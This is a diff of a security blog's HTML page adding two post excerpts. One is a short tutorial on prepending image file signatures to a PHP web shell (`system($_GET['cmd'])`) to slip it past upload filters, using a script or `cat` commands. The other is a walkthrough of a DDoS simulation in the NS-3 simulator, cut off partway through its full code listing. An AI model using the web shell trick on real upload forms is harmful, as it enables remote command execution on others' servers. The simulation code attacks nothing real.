@@ -39,6 +39,8 @@
   <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
 
   <!-- Additional head bits without overriding original head -->
+<meta name="description" content="Saket Upadhyay's Blog. (a.k.a x64Mayhem). Cyber Defense Strategies and Nature Inspired Security Research.">
+
 </head>
 
 
@@ -49,7 +51,7 @@
     <h1 class="site-title">
       <a>
         
-          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+        <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
   <path d="M0 0h24v24H0z" fill="none"/>
   <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
 </svg></span>
@@ -305,7 +307,7 @@
 </nav>
 
   <p>
-  <!-- &copy; 2020.
+  <!-- &copy; 2021.
   <a href="/LICENSE.md">MIT License.</a> -->
 </p>
 
@@ -345,6 +347,82 @@
 Easily generating PHP Payloads with Custom file signatures to bypass input sanitization
 </div>
 
+<p><img src="/assets/images/cpngh/h2.png" alt="" /></p>
+
+<h3 id="what-is-this">What is this?</h3>
+<p>A tip on bypassing input sanitation by changing the payload signature.
+This process is generally done in packet analyzer or proxy application like burp but this can be done easily without that.
+We will look into two basic ways to achieve this.</p>
+
+<h3 id="why-this-works">Why this works?</h3>
+<p>PHP generally start interpreting the script wherever <code class="language-plaintext highlighter-rouge">&lt;?php</code> tag starts so anything gibberish preceding that will not be executed and that’s good news for us as we can now append the payload after some file descriptors so that metadata of the file will show whatever we want it to show but it will still be a valid PHP script.</p>
+
+<h3 id="methods">Methods</h3>
+
+<h4 id="python-script">Python script</h4>
+
+<p>Don’t worry I have done the hard work for you, you just need to prepare your payload, we will put the burden of signature management to a script.</p>
+
+<p>Actually this is a small project where I am collecting some of the commonly used file signatures from real files (not the internet and file format wikis) this should give all the payload more convincing results.</p>
+
+<p>You can get the project from GitHub <a href="https://github.com/Saket-Upadhyay/CustomPhpPayloadSignature">HERE</a></p>
+
+<p><strong><em>With custom python script</em></strong>
+<br />
+As simple as</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python cupps.py <span class="nt">-s</span> png
+</code></pre></div></div>
+<p>this will create PHP payload <code class="language-plaintext highlighter-rouge">&lt;?php system($_GET['cmd']);?&gt;</code> with PNG signature. this is one of the commonly  known tricks to bypass most of the basic image upload scenarios.
+<img src="/assets/images/cpngh/cupps.png" alt="" /></p>
+
+<p>All the available signatures can be seen by the <code class="language-plaintext highlighter-rouge">-h</code> parameter.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python cupps.py <span class="nt">-h</span>
+
+usage: cupps.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-s</span> target_signature]
+
+Script to create PHP Payloads with custom file signatures
+
+optional arguments:
+  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
+  <span class="nt">-s</span> target_signature, <span class="nt">--signature</span> target_signature
+                        accepted inputs : png,jpg,exe,elf,gif,bmp,jar,pdf,iso
+
+~ with &lt;3 by X64M
+
+</code></pre></div></div>
+<blockquote>
+  <p>NOTE: This is an active project as of 15-08-2020 and I am trying to add more signatures to it so feel free to contribute.</p>
+</blockquote>
+
+<p><strong><em>By appending output of <code class="language-plaintext highlighter-rouge">cat</code></em></strong></p>
+
+<p>This is one of the neat tricks to achieve this.</p>
+
+<p>just do this :</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>image.png | <span class="nb">head</span> <span class="nt">-n</span> 3 <span class="o">&gt;&gt;</span>exploit.php.png
+</code></pre></div></div>
+
+<p>this will take the image header and will write to the file <code class="language-plaintext highlighter-rouge">exploit.php.png</code></p>
+
+<p>and then</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>payload.php <span class="o">&gt;&gt;</span>exploit.php.png
+</code></pre></div></div>
+<p>This will append the payload to the file with an existing image header.</p>
+
+<p><img src="/assets/images/cpngh/bt.png" alt="" /></p>
+
+<p>And that would just do it.</p>
+
+<h3 id="conclusion">Conclusion</h3>
+<p>Well, that’s it for this article. See ya in the next one!</p>
+
+<p>Till then stay caffeinated enough!</p>
+
+<p>–</p>
 
     
 
@@ -353,8 +431,6 @@ Easily generating PHP Payloads with Custom file signatures to bypass input sanit
       
       
 
-      
-        <a href="/2020/08/15/Custom-Signature-PHP-Payloads.html">More &hellip;</a>
       
     
   </article>
@@ -378,6 +454,453 @@ Easily generating PHP Payloads with Custom file signatures to bypass input sanit
 Distributed Denial of Service Attack Simuation Build from scratch in C++
 </div>
 
+<p><img src="https://miro.medium.com/max/700/1*Gaixy9imX-y-q7NJQY5qog.png" alt="" /></p>
+
+<h3 id="what-is-this">What is this?</h3>
+<p>This article is about coding a Distributed Denial of Service Attack simulation in NS-3 discrete event network simulator.</p>
+
+<h3 id="why-do-we-need-it">Why do we need it?</h3>
+
+<p>Because visual representation of basic concepts which you can play around with is better right?</p>
+
+<h3 id="where-can-you-get-the-code">Where can you get the code?</h3>
+
+<p>As part of a community project I am collecting / building multiple cybersecurity simulations and scenarios in NS3 and logging them in GitHub.</p>
+
+<p>You can check the repo from<code class="language-plaintext highlighter-rouge">PROJECTS</code> section of this site.</p>
+
+<h3 id="how-to-">How to ?</h3>
+<p>Now this is what this article is all about. Let’s jump into it.</p>
+
+<h4 id="creating-base-model">Creating Base Model</h4>
+<p>The base model for this attack is relatively simple : We have 3 main nodes Alice [n0] (Legitimate Client), Bob [ n2] (Server Application) and a connecting node in between let’s say Dave [n1].</p>
+
+<p><img src="https://miro.medium.com/max/512/1*V3PJ6E4Mba2zMnW71GwbgQ.png" alt="" />(“Legitimate Connection Model”)</p>
+
+<p>Now we will add as many bots we want to attack the network and let’s call them Mallory <code class="language-plaintext highlighter-rouge">[bi | i∈ (N)]</code>.</p>
+
+<h4 id="code-c">Code [C++]</h4>
+
+<p>Let’s first include all the required headers.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;ns3/csma-helper.h&gt;
+#include "ns3/mobility-module.h"
+#include "ns3/nstime.h"
+#include "ns3/core-module.h"
+#include "ns3/network-module.h"
+#include "ns3/internet-module.h"
+#include "ns3/point-to-point-module.h"
+#include "ns3/applications-module.h"
+#include "ns3/ipv4-global-routing-helper.h"
+#include "ns3/netanim-module.h"
+</span></code></pre></div></div>
+<p>next we define some global configurations so that we can play around with them later.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define TCP_SINK_PORT 9000
+#define UDP_SINK_PORT 9001
+</span>
+<span class="c1">//experimental parameters</span>
+<span class="cp">#define MAX_BULK_BYTES 100000
+#define DDOS_RATE "20480kb/s"
+#define MAX_SIMULATION_TIME 10.0
+</span>
+<span class="c1">//Number of Bots for DDoS</span>
+<span class="cp">#define NUMBER_OF_BOTS 10
+</span>
+<span class="n">NS_LOG_COMPONENT_DEFINE</span><span class="p">(</span><span class="s">"DDoSAttack"</span><span class="p">);</span>
+<span class="k">using</span> <span class="k">namespace</span> <span class="n">ns3</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Now inside typical <code class="language-plaintext highlighter-rouge">main()</code> function we will start creating our base model.</p>
+
+<h4 id="creating-nodes">Creating Nodes</h4>
+
+<p>Nodes are nothing but the points of communication we structured in our design phase.</p>
+
+<p>This will create 3 good nodes and as many Bot nodes defined by <code class="language-plaintext highlighter-rouge">NUMBER_OF_BOTS</code>.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Legitimate connection bots</span>
+<span class="n">NodeContainer</span> <span class="n">nodes</span><span class="p">;</span>
+<span class="n">nodes</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+
+<span class="c1">//Nodes for attack bots</span>
+<span class="n">NodeContainer</span> <span class="n">botNodes</span><span class="p">;</span>
+<span class="n">botNodes</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">NUMBER_OF_BOTS</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h4 id="connecting-nodes">Connecting Nodes</h4>
+
+<p>We can use point-to-point helper to connect different nodes.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Define the Point-To-Point Links and their Paramters</span>
+<span class="n">PointToPointHelper</span> <span class="n">pp1</span><span class="p">,</span> <span class="n">pp2</span><span class="p">;</span>
+<span class="n">pp1</span><span class="p">.</span><span class="n">SetDeviceAttribute</span><span class="p">(</span><span class="s">"DataRate"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"100Mbps"</span><span class="p">));</span>
+<span class="n">pp1</span><span class="p">.</span><span class="n">SetChannelAttribute</span><span class="p">(</span><span class="s">"Delay"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"1ms"</span><span class="p">));</span>
+
+<span class="n">pp2</span><span class="p">.</span><span class="n">SetDeviceAttribute</span><span class="p">(</span><span class="s">"DataRate"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"100Mbps"</span><span class="p">));</span>
+<span class="n">pp2</span><span class="p">.</span><span class="n">SetChannelAttribute</span><span class="p">(</span><span class="s">"Delay"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"1ms"</span><span class="p">));</span>
+
+</code></pre></div></div>
+<p>and then install the P2P device in the nodes to actually connect them. One thing to keep in mind here is that our number of bots are dynamic and we don’t want the user to change the whole algorithm when changing the number so we can use simple for loop for P2P installation in the bots.</p>
+
+<p><strong><em>We will use these “for-loops” wherever we will assign or install something to bot nodes.</em></strong></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">NetDeviceContainer</span> <span class="n">d02</span><span class="p">,</span> <span class="n">d12</span><span class="p">,</span> <span class="n">botDeviceContainer</span><span class="p">[</span><span class="n">NUMBER_OF_BOTS</span><span class="p">];</span>
+<span class="n">d02</span> <span class="o">=</span> <span class="n">pp1</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+<span class="n">d12</span> <span class="o">=</span> <span class="n">pp1</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">2</span><span class="p">));</span>
+
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUMBER_OF_BOTS</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">botDeviceContainer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pp2</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">botNodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h4 id="assignment-of-ip-address-and-internet-stack">Assignment of IP Address and Internet Stack</h4>
+
+<p>In this case we are using IPv4 Address for our nodes and can be setup by ipv4-helper class. This will connect our devices to virtual internet stack.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Assign IP to bots</span>
+<span class="n">InternetStackHelper</span> <span class="n">stack</span><span class="p">;</span>
+<span class="n">stack</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">);</span>
+<span class="n">stack</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">botNodes</span><span class="p">);</span>
+<span class="n">Ipv4AddressHelper</span> <span class="n">ipv4_n</span><span class="p">;</span>
+<span class="n">ipv4_n</span><span class="p">.</span><span class="n">SetBase</span><span class="p">(</span><span class="s">"10.0.0.0"</span><span class="p">,</span> <span class="s">"255.255.255.252"</span><span class="p">);</span>
+
+<span class="n">Ipv4AddressHelper</span> <span class="n">a02</span><span class="p">,</span> <span class="n">a12</span><span class="p">,</span> <span class="n">a23</span><span class="p">,</span> <span class="n">a34</span><span class="p">;</span>
+<span class="n">a02</span><span class="p">.</span><span class="n">SetBase</span><span class="p">(</span><span class="s">"10.1.1.0"</span><span class="p">,</span> <span class="s">"255.255.255.0"</span><span class="p">);</span>
+<span class="n">a12</span><span class="p">.</span><span class="n">SetBase</span><span class="p">(</span><span class="s">"10.1.2.0"</span><span class="p">,</span> <span class="s">"255.255.255.0"</span><span class="p">);</span>
+
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">NUMBER_OF_BOTS</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ipv4_n</span><span class="p">.</span><span class="n">Assign</span><span class="p">(</span><span class="n">botDeviceContainer</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
+    <span class="n">ipv4_n</span><span class="p">.</span><span class="n">NewNetwork</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="c1">//Assign IP to legitimate nodes</span>
+<span class="n">Ipv4InterfaceContainer</span> <span class="n">i02</span><span class="p">,</span> <span class="n">i12</span><span class="p">;</span>
+<span class="n">i02</span> <span class="o">=</span> <span class="n">a02</span><span class="p">.</span><span class="n">Assign</span><span class="p">(</span><span class="n">d02</span><span class="p">);</span>
+<span class="n">i12</span> <span class="o">=</span> <span class="n">a12</span><span class="p">.</span><span class="n">Assign</span><span class="p">(</span><span class="n">d12</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h4 id="installing-attacker-application-in-the-bots">Installing Attacker Application in the bots</h4>
+
+<p>Now we want to install applications in our nodes so that they can communicate with their neighbors. Let’s create attacker application.</p>
+
+<p>The attacker application in this case is simple UDP OnOff Sender which can be created by :</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// DDoS Application Behaviour</span>
+<span class="n">OnOffHelper</span> <span class="nf">onoff</span><span class="p">(</span><span class="s">"ns3::UdpSocketFactory"</span><span class="p">,</span> <span class="n">Address</span><span class="p">(</span><span class="n">InetSocketAddress</span><span class="p">(</span><span class="n">i12</span><span class="p">.</span><span class="n">GetAddress</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">UDP_SINK_PORT</span><span class="p">)));</span>
+<span class="n">onoff</span><span class="p">.</span><span class="n">SetConstantRate</span><span class="p">(</span><span class="n">DataRate</span><span class="p">(</span><span class="n">DDOS_RATE</span><span class="p">));</span>
+<span class="n">onoff</span><span class="p">.</span><span class="n">SetAttribute</span><span class="p">(</span><span class="s">"OnTime"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"ns3::ConstantRandomVariable[Constant=30]"</span><span class="p">));</span>
+<span class="n">onoff</span><span class="p">.</span><span class="n">SetAttribute</span><span class="p">(</span><span class="s">"OffTime"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"ns3::ConstantRandomVariable[Constant=0]"</span><span class="p">));</span>
+<span class="n">ApplicationContainer</span> <span class="n">onOffApp</span><span class="p">[</span><span class="n">NUMBER_OF_BOTS</span><span class="p">];</span>
+</code></pre></div></div>
+<p>Then we can install in each bot node by :</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Install application in all bots</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">NUMBER_OF_BOTS</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">onOffApp</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">onoff</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">botNodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="n">k</span><span class="p">));</span>
+    <span class="n">onOffApp</span><span class="p">[</span><span class="n">k</span><span class="p">].</span><span class="n">Start</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="mf">0.0</span><span class="p">));</span>
+    <span class="n">onOffApp</span><span class="p">[</span><span class="n">k</span><span class="p">].</span><span class="n">Stop</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="n">MAX_SIMULATION_TIME</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h4 id="client-application">Client Application</h4>
+
+<p>Now the client also needs application stack to simulate communication from server. We will use BulkTCP connection for this purpose simulation some large file transfer for resource request.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Sender Application (Packets generated by this application are throttled)</span>
+<span class="n">BulkSendHelper</span> <span class="nf">bulkSend</span><span class="p">(</span><span class="s">"ns3::TcpSocketFactory"</span><span class="p">,</span> <span class="n">InetSocketAddress</span><span class="p">(</span><span class="n">i12</span><span class="p">.</span><span class="n">GetAddress</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">TCP_SINK_PORT</span><span class="p">));</span>
+<span class="n">bulkSend</span><span class="p">.</span><span class="n">SetAttribute</span><span class="p">(</span><span class="s">"MaxBytes"</span><span class="p">,</span> <span class="n">UintegerValue</span><span class="p">(</span><span class="n">MAX_BULK_BYTES</span><span class="p">));</span>
+<span class="n">ApplicationContainer</span> <span class="n">bulkSendApp</span> <span class="o">=</span> <span class="n">bulkSend</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+<span class="n">bulkSendApp</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="mf">0.0</span><span class="p">));</span>
+<span class="n">bulkSendApp</span><span class="p">.</span><span class="n">Stop</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="n">MAX_SIMULATION_TIME</span> <span class="o">-</span> <span class="mi">10</span><span class="p">));</span>
+
+</code></pre></div></div>
+
+<h4 id="server-side-tcp-and-udp-sinks">Server Side TCP and UDP sinks</h4>
+
+<p>Now let’s install application in our server to receive these packets</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// UDPSink on receiver side</span>
+<span class="n">PacketSinkHelper</span> <span class="nf">UDPsink</span><span class="p">(</span><span class="s">"ns3::UdpSocketFactory"</span><span class="p">,</span>
+                         <span class="n">Address</span><span class="p">(</span><span class="n">InetSocketAddress</span><span class="p">(</span><span class="n">Ipv4Address</span><span class="o">::</span><span class="n">GetAny</span><span class="p">(),</span> <span class="n">UDP_SINK_PORT</span><span class="p">)));</span>
+<span class="n">ApplicationContainer</span> <span class="n">UDPSinkApp</span> <span class="o">=</span> <span class="n">UDPsink</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">2</span><span class="p">));</span>
+<span class="n">UDPSinkApp</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="mf">0.0</span><span class="p">));</span>
+<span class="n">UDPSinkApp</span><span class="p">.</span><span class="n">Stop</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="n">MAX_SIMULATION_TIME</span><span class="p">));</span>
+
+<span class="c1">// TCP Sink Application on server side</span>
+<span class="n">PacketSinkHelper</span> <span class="nf">TCPsink</span><span class="p">(</span><span class="s">"ns3::TcpSocketFactory"</span><span class="p">,</span>
+                         <span class="n">InetSocketAddress</span><span class="p">(</span><span class="n">Ipv4Address</span><span class="o">::</span><span class="n">GetAny</span><span class="p">(),</span> <span class="n">TCP_SINK_PORT</span><span class="p">));</span>
+<span class="n">ApplicationContainer</span> <span class="n">TCPSinkApp</span> <span class="o">=</span> <span class="n">TCPsink</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">2</span><span class="p">));</span>
+<span class="n">TCPSinkApp</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="mf">0.0</span><span class="p">));</span>
+<span class="n">TCPSinkApp</span><span class="p">.</span><span class="n">Stop</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="n">MAX_SIMULATION_TIME</span><span class="p">));</span>
+
+</code></pre></div></div>
+
+<p>We can then populate the IP ROUTING TABLE by :</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Ipv4GlobalRoutingHelper</span><span class="o">::</span><span class="n">PopulateRoutingTables</span><span class="p">();</span>
+</code></pre></div></div>
+<p>This will bake all the network connections and applications in place for simulation.</p>
+
+<h4 id="setting-up-animation-in-netanim-module">Setting up Animation in NetAnim Module</h4>
+
+<p>Our main structure is complete and now we can prepare our simulation grounds.</p>
+
+<p>Configuring mobility in nodes:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Simulation NetAnim configuration and node placement</span>
+<span class="n">MobilityHelper</span> <span class="n">mobility</span><span class="p">;</span>
+
+<span class="n">mobility</span><span class="p">.</span><span class="n">SetPositionAllocator</span><span class="p">(</span><span class="s">"ns3::GridPositionAllocator"</span><span class="p">,</span>
+                              <span class="s">"MinX"</span><span class="p">,</span> <span class="n">DoubleValue</span><span class="p">(</span><span class="mf">0.0</span><span class="p">),</span> <span class="s">"MinY"</span><span class="p">,</span> <span class="n">DoubleValue</span><span class="p">(</span><span class="mf">0.0</span><span class="p">),</span> <span class="s">"DeltaX"</span><span class="p">,</span> <span class="n">DoubleValue</span><span class="p">(</span><span class="mf">5.0</span><span class="p">),</span> <span class="s">"DeltaY"</span><span class="p">,</span> <span class="n">DoubleValue</span><span class="p">(</span><span class="mf">10.0</span><span class="p">),</span>
+                              <span class="s">"GridWidth"</span><span class="p">,</span> <span class="n">UintegerValue</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span> <span class="s">"LayoutType"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"RowFirst"</span><span class="p">));</span>
+
+<span class="n">mobility</span><span class="p">.</span><span class="n">SetMobilityModel</span><span class="p">(</span><span class="s">"ns3::ConstantPositionMobilityModel"</span><span class="p">);</span>
+
+<span class="n">mobility</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">);</span>
+<span class="n">mobility</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">botNodes</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Placing Nodes in Simulation Grid:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">AnimationInterface</span> <span class="nf">anim</span><span class="p">(</span><span class="s">"DDoSim.xml"</span><span class="p">);</span>
+
+<span class="n">ns3</span><span class="o">::</span><span class="n">AnimationInterface</span><span class="o">::</span><span class="n">SetConstantPosition</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="n">ns3</span><span class="o">::</span><span class="n">AnimationInterface</span><span class="o">::</span><span class="n">SetConstantPosition</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+<span class="n">ns3</span><span class="o">::</span><span class="n">AnimationInterface</span><span class="o">::</span><span class="n">SetConstantPosition</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+
+<span class="kt">uint32_t</span> <span class="n">x_pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">l</span> <span class="o">&lt;</span> <span class="n">NUMBER_OF_BOTS</span><span class="p">;</span> <span class="o">++</span><span class="n">l</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ns3</span><span class="o">::</span><span class="n">AnimationInterface</span><span class="o">::</span><span class="n">SetConstantPosition</span><span class="p">(</span><span class="n">botNodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="n">l</span><span class="p">),</span> <span class="n">x_pos</span><span class="o">++</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>We are almost done then we just need to run the simulation and view in NetAnim.</p>
+
+<h3 id="full-code">Full Code</h3>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*       
+ * LICENSE : GNU General Public License v3.0 (https://github.com/Saket-Upadhyay/ns3-cybersecurity-simulations/blob/master/LICENSE)
+ * REPOSITORY : https://github.com/Saket-Upadhyay/ns3-cybersecurity-simulations
+ * =================================================================================
+ * 
+ * In this we follow the following setup / node placement
+ * 
+ *    (n1)
+ *      \
+ *       \
+ *         -------- (n2) -------- (n3)
+ *                 / |  \
+ *                /  |   \ 
+ *               /   |    \
+ *             (B0),(B2)...(Bn) 
+ *                 
+ *  N0 is legitimate user, communicating with server N2 (data server) via node N1 (maybe website server interface )
+ *  B0-Bn are bots DDoS-ing the network.
+ * 
+ * NetAnim XML is saved as -&gt; DDoSim.xml 
+ *  
+ */</span>
+<span class="cp">#include &lt;ns3/csma-helper.h&gt;
+#include "ns3/mobility-module.h"
+#include "ns3/nstime.h"
+#include "ns3/core-module.h"
+#include "ns3/network-module.h"
+#include "ns3/internet-module.h"
+#include "ns3/point-to-point-module.h"
+#include "ns3/applications-module.h"
+#include "ns3/ipv4-global-routing-helper.h"
+#include "ns3/netanim-module.h"
+</span>
+<span class="cp">#define TCP_SINK_PORT 9000
+#define UDP_SINK_PORT 9001
+</span>
+<span class="c1">//experimental parameters</span>
+<span class="cp">#define MAX_BULK_BYTES 100000
+#define DDOS_RATE "20480kb/s"
+#define MAX_SIMULATION_TIME 10.0
+</span>
+<span class="c1">//Number of Bots for DDoS</span>
+<span class="cp">#define NUMBER_OF_BOTS 10
+</span>
+<span class="k">using</span> <span class="k">namespace</span> <span class="n">ns3</span><span class="p">;</span>
+
+<span class="n">NS_LOG_COMPONENT_DEFINE</span><span class="p">(</span><span class="s">"DDoSAttack"</span><span class="p">);</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="n">CommandLine</span> <span class="n">cmd</span><span class="p">;</span>
+    <span class="n">cmd</span><span class="p">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+
+    <span class="n">Time</span><span class="o">::</span><span class="n">SetResolution</span><span class="p">(</span><span class="n">Time</span><span class="o">::</span><span class="n">NS</span><span class="p">);</span>
+    <span class="n">LogComponentEnable</span><span class="p">(</span><span class="s">"UdpEchoClientApplication"</span><span class="p">,</span> <span class="n">LOG_LEVEL_INFO</span><span class="p">);</span>
+    <span class="n">LogComponentEnable</span><span class="p">(</span><span class="s">"UdpEchoServerApplication"</span><span class="p">,</span> <span class="n">LOG_LEVEL_INFO</span><span class="p">);</span>
+
+
+    <span class="c1">//Legitimate connection bots</span>
+    <span class="n">NodeContainer</span> <span class="n">nodes</span><span class="p">;</span>
+    <span class="n">nodes</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+
+    <span class="c1">//Nodes for attack bots</span>
+    <span class="n">NodeContainer</span> <span class="n">botNodes</span><span class="p">;</span>
+    <span class="n">botNodes</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">NUMBER_OF_BOTS</span><span class="p">);</span>
+
+    <span class="c1">// Define the Point-To-Point Links and their Paramters</span>
+    <span class="n">PointToPointHelper</span> <span class="n">pp1</span><span class="p">,</span> <span class="n">pp2</span><span class="p">;</span>
+    <span class="n">pp1</span><span class="p">.</span><span class="n">SetDeviceAttribute</span><span class="p">(</span><span class="s">"DataRate"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"100Mbps"</span><span class="p">));</span>
